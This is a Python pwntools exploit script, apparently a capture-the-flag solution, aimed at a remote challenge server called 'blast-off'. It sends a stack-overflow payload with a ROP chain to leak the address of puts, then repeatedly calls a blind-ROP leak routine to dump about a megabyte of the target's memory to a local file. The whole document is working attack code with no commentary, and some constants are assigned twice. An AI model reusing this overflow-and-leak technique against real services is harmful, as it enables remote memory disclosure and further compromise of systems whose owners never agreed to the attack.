#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *

#  context.log_level = 'debug'

def leak(length, rdi_ret, puts_plt, leak_addr, main_addr):
    sh=remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")
    payload = b'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(main_addr)
    sh.recvuntil(b'Please enter the launch codes to start: \n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index(b"\nPlease enter the launch codes to start:")]
        except Exception:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception as e:
        sh.close()
        return None

uu64 = lambda x: u64(x.ljust(8, b'\x00'))
puts_plt = 0x400690
brop_gadget = 0x400b4a
b_off_got = 0x602038
main_addr = 0x400991
puts_plt = 0x400690
brop_gadget = 0x400b4a
b_off_got = 0x602038
main_addr = 0x400991
padding_len = 0x28
pop_rdi_ret = brop_gadget + 0x9
pop_rsi_r15_ret = brop_gadget + 0x7
puts_got = 0x201982 + puts_plt + 6

sh=remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")
sh.recvuntil(b'enter the launch codes to start: \n')
payload = b"a"*padding_len
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
sh.sendline(payload)
puts_addr = uu64(sh.recvuntil(b"\nPlease", drop=True))
print(puts_addr)
sh.close()

##length = getbufferflow_length()
length = 0x28
##brop_gadget = find_brop_gadget(length,stop_gadget)
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
addr = puts_addr
result = b""
while addr < puts_addr+0x100000:
    print(hex(addr))
    data = leak(length, rdi_ret, puts_plt, addr, main_addr)
    if data is None:
        data = b"\x00"
        result += data
    else:
        result += data
    addr += len(data)
    with open('./code', 'wb') as f:
        f.write(result)
